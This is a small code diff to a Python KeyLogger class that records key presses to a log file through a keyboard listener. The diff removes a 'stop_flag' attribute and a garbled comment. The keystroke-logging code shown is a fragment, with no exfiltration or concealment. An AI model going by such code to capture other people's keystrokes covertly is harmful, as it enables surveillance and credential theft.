@@ -16,8 +16,6 @@ class KeyLogger:
 
         self.keylog_filename = keylog_filename
 
-        # Sets the flag to stop l# Initialize listener
-        self.stop_flag = False
         # Init listener
         self.listener = Listener(on_press=self._keypress_callback)
 
@@ -33,8 +31,6 @@ class KeyLogger:
         """
         Starts logging key presses
         """
-
-        self.stop_flag = False
 
         # Initialize listener
         self.listener = Listener(on_press=self._keypress_callback)
